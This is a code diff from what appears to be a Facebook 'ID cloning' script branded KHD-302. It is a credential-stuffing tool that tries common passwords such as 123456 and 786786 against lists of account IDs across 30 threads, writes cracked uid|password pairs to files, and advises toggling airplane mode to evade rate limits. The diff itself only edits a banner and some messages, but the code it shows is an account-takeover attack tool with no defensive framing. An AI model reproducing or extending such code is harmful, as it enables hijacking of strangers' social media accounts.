@@ -402,7 +402,7 @@ logo = """
 888    Y88b 888         888.  8888888P"      
                                                                                
 \x1b[1;97m---------------------------------------------------
-\33[1;41mKHD-302 X RSU FATHER OF HITTLER\33[0m
+\33[1;41mKHD-302 X RSU BRAND REAL FATHER OF HITTLER\33[0m
 \x1b[1;97m---------------------------------------------------
 \x1b[1;97m[+] AUTHOR         : KHD 302 BRAND
 \x1b[1;97m[+] FB PAGE.       : ZEE BALOCH
@@ -919,7 +919,7 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] Exemple(123456 786786 112233 445566) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
@@ -929,7 +929,7 @@ class Main:
 				print("     \033[0;93m   WELCOME TO FB CLONING WORLD")
 				print("\n\033[0;94m [+] STARTING CLONING")
 				print(" \033[0;96m[+] NOTE: CP IDZ OPEN IN 15 DAYS")
-				print(" [!] IF NO RESULTS USE AEROPLANE FOR10 SECOND")
+				print(" [!] IF NO RESULTS USE AEROPLANE FOR 10 SECOND")
 				print("\033[0;94m--------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
@@ -1327,7 +1327,7 @@ class Main:
 				open("KHD OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[ZEE OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[KHD OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
